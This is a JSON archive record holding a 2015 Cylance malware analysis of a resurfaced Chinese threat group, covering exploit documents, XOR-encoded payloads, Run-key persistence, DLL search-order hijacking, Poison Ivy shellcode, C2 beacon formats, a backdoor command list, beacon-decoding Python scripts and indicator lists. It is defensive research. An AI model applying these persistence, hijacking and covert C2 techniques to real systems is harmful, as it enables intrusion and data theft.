{
    "id": "e34ccbb9-c52f-4538-90e4-5fc378bbcf78",
    "created_at": "2022-10-25T16:48:25.127125Z",
    "updated_at": "2025-03-27T02:06:07.82727Z",
    "deleted_at": null,
    "sha1_hash": "2c19d922bfa84a0205d9142124caaa51dc2021f5",
    "title": "Cylance Spear Team: A Threat Actor Resurfaces",
    "authors": "Cylance",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 953345,
    "plain_text": "## Cylance SPEAR Team: A Threat Actor Resurfaces\n\nMay 13, 2015\n\n[By Jon Gross(http://blog.cylance.com/author/jon-gross)](http://blog.cylance.com/author/jon-gross)\n\nShare This:\n\nAttackers typically shut down campaigns or halt activity after they are exposed by security researchers,\n\nthereby creating the impression they have dropped off the map. This often leads to a false sense of security\n\nwithin the community and perpetuates the idea that public exposure makes us all safer. While the exposed\n\nactivity is no longer observed, attackers simply continue in the background – evolving or altering their tactics\n\nto seamlessly continue operations with increasingly advanced malware. So while potentially making us safer\n\nin the short-term, exposure often forces a Darwinian evolution in malware.\n\nSeveral months ago I examined a malware-tainted Word document titled “ISIS_twitter_list.doc.” I didn’t think\n\nmuch of it and quickly moved on after a cursory analysis. Yet I recently uncovered evidence that suggests it\n\nwas the work of a well-known Chinese threat group. This group is known to have targeted U.S. government\n\nagencies, defense contractors, aerospace firms and foreign militaries since 2009. Until now, it was widely\n\nbelieved the actor's activities had largely subsided in 2013, following numerous public disclosures and\n\ndetailed analyses of their backdoors.\n\nOur technical analysis shows the group has remained active. We are releasing this data to help victims\n\nidentify and remediate the threat. Click here(http://blog.cylance.com/spear-a-threat-actor\nresurfaces#mitigation) to get to recommended mitigations, or for all the technical details read on:\n\n\n-----\n\nVirustotal from a user in India. Other targets identified were predominantly located in Australia, New\n\nZealand, Vietnam and the United States.\n\n#### File Details\n\n**Name** ISIS_twitter_list.doc\n\n**SHA256** 6ba1d42c6493b18548e30bd60ca3d07a140d9d1945cf4e2b542e4a6d23913f40\n\n**File Size** 146,338 bytes\n\nThe first stage shellcode searches for the marker \"GfCv\" then checks the next four bytes are \"EF FE EC CE\" in\n\nthe document then decodes the second stage shellcode using the four-byte XOR key \"0x29F7C592\". This\n\nsecond stage finds and decodes an encoded executable beginning at offset 0x33A2.\n\nThe binary is encoded using a variable 4-byte XOR key that is generated by starting with the 4-byte key\n\n0x7FFEFC00; this XOR key is then permutated every four bytes by rotating the first two bytes of the key by\n\n0x1 and shifting the bits of the next two bytes right by 0x1, so the next 4-byte XOR key in the series would be\n\n0x3FFF7E00. It includes some logic to exclude XOR'ng any bytes that match 0x00000000 or the current 4\nbyte XOR key.\n\nFor the binary mathematically impaired like myself the 4-byte keys will eventually repeat in effect creating a\n\n256-byte XOR key. The decoded binary will be written to the filesystem as\n\n\"%APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx\".\n\n#### File Details\n\n**Full File Path** %APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx\n**SHA256** 9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165\n**File Size** 107,008 bytes\n**Compile Time** 2/4/2015 8:41:42 UTC\n\n\n-----\n\nThe malware does not execute immediately after successful exploitation and instead just creates a Run key\n\nin the current user's hive which will execute the next time the victim user accesses the system.\n\n**Registry Persistence Key** HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates\n**Registry Key Value** Rundll32.exe \"%APPDATA%\\Microsoft\\SystemCertificates\\Certificates.ocx\",Setup\n\nThe ocx file is actually a DLL and provides the attacker the ability to upload, download, enumerate, delete,\n\nsearch, and execute files as well as list drivers on the system. The binary is designed to be called from its one\n\nexported function, \"Setup\"; the Run key will ensure that whenever the victim user logs into the system the\n\nbackdoor will execute. The binary is configured to communicate to \"www.microsoftservices.proxydns.com\"\n\non port 80 using standard HTTP POST and GET requests. The domain at the time of this report resolved to\n\nthe IP address, \"103.229.125.157\". Additionally the dynamic DNS domains \"fighthard.mooo.com\" and\n\n\"rampage.freetcp.com\" have both historically resolved to this IP address.\n\n**Example initial beacon request:**\n\nGET /login?wd=hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q\nH5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH\nnofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==\n\nHTTP/1.1\n\n\n-----\n\nHost: www.microsoftservices.proxydns.com\n\nCache-Control: no-cache\n\nThe above beacon request can be decoded by base64 decoding with this alphabet,\n\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_\". Then RC4 decrypting the\n\nresulting string using the first four bytes of the payload as the decryption key. The following python script\n\nwill make this easy:\n\nfrom Crypto.Cipher import ARC4\n\nimport base64,binascii,string\n\ndef customb64decode(s):\n\nnewalphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'\n\noldalphabet = string.uppercase + string.lowercase + string.digits + \"+/\"\n\ns = s.translate(string.maketrans(newalphabet, oldalphabet))\n\nreturn base64.b64decode(s)\n\nreq = \"hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q\nH5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH\nnofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==\"\n\nunb64 = customb64decode(req)\n\nrc4 = ARC4.new(unb64[0:4])\n\ndec = rc4.decrypt(unb64[4::])\n\nprint dec\n\nDecoding the string will yield the following:\n\nk:9C18CDFE\n\ns:masst\n\nh:<HOSTNAME>\n\nu:<USERNAME>\n\no:win32.5.1.2600.2.1.Service Pack 3\n\nm:<MAC ADDRESS>\n\n\n-----\n\nm is the mac address.\n\nBased upon some cursory analysis the backdoor will look for encrypted commands within HTML comments\n\nreturned from the C2 using the following format: \"<!­­?*$@COMMAND GOES HERE@$*?­­!>;\" however,\n\nthe C2 was not active at the time of analysis so this could not be confirmed. The backdoor may also make\n\nrequests to the C2 over HTTP using the following parameters in the URI string \"query?sid=\" and \"result?\n\nsid=\".\n\nThe PDB path, C:\\Codes\\Eoehttp\\Release\\Eoehttp.pdb, was also left in the backdoor although no\n\nother instances of this path could be identified. Several additional exploit documents were identified by\n\ninvestigating the domains \"fighthard.mooo.com\" and \"rampage.freetcp.com\".\n\n# Down the Intelligence Rabbit Hole\n\nFighthard.mooo.com additionally resolved to 173.224.214.12 in February of 2014.\n\nThe following exploit documents were identified to contain a payload which communicated to this domain:\n\n**Naval Science Curriculum 2014.doc** 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c\n**1.doc** c593a844a87b3e40346efd5d314c55c5094d5bf191f9bb1aeec8078f6d07c0cd\n**Republic Day speech 27 Jan 2014.doc** 3219767408bba3fa41b9ab5f964531cf608fb0288684748d6ac0b50cf108c911\n\nRampage.freetcp.com still resolves to 103.229.125.157 as of 4/2/2015\n\nLet's go ahead and take a look further into one of the other expoit documents,\n\n8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c.\n\n**SHA256** 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c\n**Name** Naval Science Curriculum 2014.doc\n**File Size** 459,087\n\nThe document exploits old faithful, CVE-2012-0158(http://www.cve.mitre.org/cgi-bin/cvename.cgi?\n\nname=CVE-2012-0158), but instead of using a MIME encoded document this file was just a plain RTX\n\ndocument. Yes that's not a misspelling Word is happy to open this RTF format as well. So for anyone\n\nexploring and hunting RTF documents you may also want to start looking for the \"{\\rtx\" header. We'll skip\n\nthe shellcode analysis for now and go directly to the binary which is stored beginning at offset 0x1BC27 as\n\nan ASCII hex-encoded, xor-encoded binary. It can be decoded using the XOR key \"0xBF\". Upon successful\n\nexploitation the decoded binary will be written first to %TEMP%\\dw20.EXE then copied to\n\n%WINDIR%\\msascm32.drv. No other changes are made to the system.\n\n#### File Details\n\n**Full File Path:** %WINDIR%\\msacm32.drv\n**SHA256:** 67bd81f4c5e129d19ae71077be8b68dc60e16c19019b2c64cdcedca1f43f0ae3\n**File Size:** 108 544 Bytes\n\n\n-----\n\noriginal file's (%WINDIR%\\system32\\msacm32.drv) imported functions, it's clear the DLL is responsible for\n\nsome type of audio processing and/or playback. A quick search on the internet confirmed this so I added a\n\nsoundcard to my VM.\n\nOn reboot explorer.exe was now happy to load the backdoor and get down to business; this technique is\n\nknown as dll search order hijacking or binary planting. Interestingly the backdoor will also load the legitimate\n\nsystem32\\msacm32.drv file resolve functions and pass calls to it so it doesn't break audio playback on the\n\nvictim system. The backdoor contains identical exports as well as an additional dummy function from the\n\nlegitimate msacm32.drv called \"StartWork\" which can be used to reliably identify similar samples. The\n\nbackdoor routine exists inside the DllMain function so when explorer.exe loads the backdoor via\n\nLoadLibrary it will begin spawning malicious threads.\n\nA PDB path was also left in this binary C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb; A quick\n\ngoogle search will lead you to a YARA rule written by Patrick Olsen and the very similar sample\n\n869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80. The\n\ntwo files also have an identical compilation time, which suggests the backdoor is probably not recompiled\n\nvery often and instead the attacker simply updates the callback configuration information.\n\nThe backdoor interestingly contains the well known Poison Ivy RAT shellcode as well as its own custom\n\nbackdoor. It will first attempt to communicate to fighthard.mooo.com using the poison ivy binary protocol\n\nwith the default connection password of \"admin\". The Poison Ivy shellcode is encrypted using a custom\n\ncipher with the key \"Tiger324{\" beginning at offset 0xFA5 and ending at 0x159E. If this initial connection fails\n\nit will revert to the secondary backdoor, which utilizes HTTP GET and POST requests somewhat similar to the\n\nones described above to the internal IP address \"192.168.2.26\". This suggested the attacker had already\n\ncompromised other systems in the environment and was using an internal C2 mechanism for a fallback.\n\n**Example Internal Beacon:**\n\nGET /login.asp?\n\np*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX\n\nEJ7OZkvwBZVx1JsrhQ== HTTP/1.1\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)\n\nHost: 192.168.2.26\n\nRequests may also be made to the following pages: \"check.asp\", \"result.asp\", and \"upload.asp\". The request\n\nstructure is slightly different in that it uses the base64 alphabet\n\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+*\". The resulting request can\n\nbe decoded further by using the first 16 bytes of the result as an XOR key to decode the rest of the payload.\n\nIt also uses a static User-Agent string of \"Mozilla/4.0 (compatible; MSIE 8.0; Win32)\" for each request.\n\nThe following script simplifies this process:\n\n\n-----\n\nk = 0\n\nfor i in buf:\n\nif k == len(key):\n\nk = 0\n\nout += chr(ord(i) ^ ord(key[k]))\n\nk += 1\n\nreturn out\n\nreq =\n\n'p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9I\n\nXEJ7OZkvwBZVx1JsrhQ=='\n\nunb64 = base64.b64decode(req,'+*')\n\ndec = rolling_xor(unb64[16::],unb64[0:16])\n\nprint dec\n\nThe request decodes to \"123|000000+|USER-D6921F6215|Administrator|-1676096002|1.0|0|\", where\n\nvalues are separated by the delimiter \"|\". \"123\" is a campaign identifier hard coded into the backdoor. I\n\ndon't know what \"000000+\" is but it's also a hard coded value; my best guess is it's to modify the timezone of\n\nthe timestamp. \"USER-D6921F6215\" is the hostname of the victim, \"Administrator\" is the victim user,\n\n\"1676096002\" is the current Date/Time in decimal, and \"1.0\" is a version number also stored in the\n\nbackdoor.The 16-byte XOR key will be randomly generated per each request. Results from commands will\n\nbe sent back encoded to the server to the \"result.asp\" page.\n\nThe backdoor will accept the following commands:\n\n_#runhfcore- starts the main PI backdoor functionality in a separate thread_\n#getdrivelist? - enumerates logical drives on the system\n#getfilelist? - enumerates logical files using FindFirst FindNext technique\n#delfile- deletes a file using the DeleteFileA API\n#newupload? - uploads a file\n#newdownload? - downloads a file\n#runfile- - executes a file on the system via CreateProcess API\n#urldownload? - will download a file from a remote URL using InternetOpen and InternetReadFile\n#sleep? - Sleeps for a specified number of minutes\n#delay? - exact functionality unknown appears to force another request to the C2 page check.asp\n#maxblock? - exact functionality unknown appears to force another request to the C2 page\ncheck.asp\n#stop! - exact functionality unknown appears to force another request to the C2 page check.asp\n\nCommands with a ? appear to take an additional parameter while files that end in - require a full file path.\n\nThe backdoor is also capable of elevating its privileges on win7 and above using a method similar to the one\n\ndescribed here: http://www.pretentiousname.com/misc/win7_uac_whitelist2.html. I thought it was\n\ninteresting the backdoor used a secondary backup backdoor in addition to its primary payload.\n\nThe first communicated directly outside the network using a well known RAT protocol and if that failed the\n\nsecondary much stealthier backdoor communicated to an internal C2 address using it's own custom\n\nencoded HTTP based protocol. The use of a relatively undisclosed DLL search order hijack also made this\n\n\n-----\n\nexploit documents were similar to the one described above with different network callbacks.\n\nAnd now to tie all this back to the \"well-known\" threat group. The \"173.224.214.12\" IP address that\n\n\"fighthard.mooo.com\" previously resolved to also historically had two other domains point to it\n\n\"queenberry.www1.biz\" and \"word.crabdance.com\". \"word.crabdance.com\" previously resolved to\n\n\"64.71.162.70\" on September 8, 2012 and 108.171.246.140 on February 19, 2014. The \"64.71.162.70\"\n\naddress and the associated domain \"www.ollay011.zyns.com\" are rather infamous and the first mention of it\n\nI could find is in this shadowserver post: http://blog.shadowserver.org/2012/04/16/beware-of-what-you\ndownload-recent-purported-ceiec-document-dump-booby-trapped/ related to exploit documents identified\n\nin a data dump from Hardcore Charlie. If you follow the rabbit hole deep enough you can eventually trace\n\nsamples via domain and IP address crossover back to the FBI flash #A-000009-MW from mid 2013.\n\nAdditional domains and IP addresses related to this group are included in the appendix.\n\n# Mitigation\n\nWhile defending against the constant stream of new malware from advanced threat groups may be difficult,\n\norganizations can take some relatively easy steps to help identify intrusions. This group is among the\n\nnumerous threat actors who rely almost exclusively on Dynamic DNS infrastructure. They seem to prefer\n\nChangeIP (https://www.changeip.com/services/free-dynamic-dns/(https://www.changeip.com/services/free\n[dynamic-dns/)) and Afraid (https://freedns.afraid.org/(https://freedns.afraid.org/)) for free DNS services,](https://freedns.afraid.org/)\n\nalthough they previously heavily used Sitelutions\n\n[(https://sitelutions.com/info/sldns(https://sitelutions.com/info/sldns)). While there are some legitimate](https://sitelutions.com/info/sldns)\n\ninstances of dynamic DNS in corporate environments, it only accounts for a small percentage of traffic.\n\nMonitoring and/or blocking dynamic DNS requests should help detect attacks by this actor. Any dynamic\n\nDNS domains that resolve to non-routable IP addresses, like 127.0.0.1 or private IP addresses, should be\n\nthoroughly investigated. The HTTP traffic generated by both samples uses a limited number of header fields,\n\nwhich is substantially different from the majority of traffic generated by modern browsers. As always, don't\n\nopen E-mail attachments from untrusted parties.\n\n### APPENDIX A: Associated IP Addresses and Domains\n\n#### 103.229.125.157 microsoftservices.proxydns.com - current rampage.freetcp.com - current fighthard.mooo.com - 9/8/2014\n\n 103.238.227.69 www.micro.zyns.com - current computer001.dumb1.com - current microlab.dns04.com - current\n\n 173.224.214.12 word.crabdance.com - 11/12/2012 fighhard.mooo.com - 1/31/2014\n\n\n-----\n\n#### 121.127.249.97 queenberry.www1.biz - 10/1/2014 anhtuan88.ns01.biz anhphuong85.www1.biz\n\n 64.71.162.70 word.crabdance.com - 9/8/2012 www.fornobody.dns04.com ftp.fornobody.dns04.com fornobody.dns04.com\n\n 199.192.153.72 fornobody.dns04.com - 9/2/2011 www.qwertyui.dns04.com - 2/24/2012\n 64.71.138.240 www.qwertyui.dns04.com - 3/3/2012 beyondbuck.dns1.us letitsnowsmart.instanthq.com prime98.jumpingcrab.com fuck.ruouvangnhatrang.com\n\n 59.188.250.161 www.micro1.zyns.com\n\n 118.99.13.184 www.micro.zyns.com www.micro1.zyns.com\n\n 180.210.204.157 www.qwertyui.dns04.com - 3/2/2011 www.ollay011.zyns.com - 3/4/2011 www.olay033.dns04.com - 3/12/2011 www.olay044.dns04.com - 4/30/2011 9999992009.rr.nu 9999992011.rr.nu 9999992009.myfw.us\n\n 64.62.202.82 www.qwertyui.dns04.com - 3/4/2012 microlab.mrslove.com\n\n**203.80.238.183**\n\nwww.qwertyui.dns04.com - 10/8/2010\n\nwww.olay033.dns04.com - 10/4/2010\n\nwebhosts.sytes.net\n\n### APPENDIX B: Phishing Emails Associated with the Campaign\n\n\n-----\n\n-----\n\n-----\n\n[Tags: CylanceSPEAR(http://blog.cylance.com/topic/cylancespear)](http://blog.cylance.com/topic/cylancespear)\n\n#### « Back to Blog(http://blog.cylance.com)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/ma0qrrczbji4grvjbezpeugf3gru084x",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.05.13.Spear_Threat/Cylance%20SPEAR%20Team_%20A%20Threat%20Actor%20Resurfaces.pdf"
    ],
    "report_names": [
        "Cylance SPEAR Team_ A Threat Actor Resurfaces"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716505,
    "ts_updated_at": 1743041167,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/2c19d922bfa84a0205d9142124caaa51dc2021f5.pdf",
        "text": "https://archive.orkl.eu/2c19d922bfa84a0205d9142124caaa51dc2021f5.txt",
        "img": "https://archive.orkl.eu/2c19d922bfa84a0205d9142124caaa51dc2021f5.jpg"
    }
}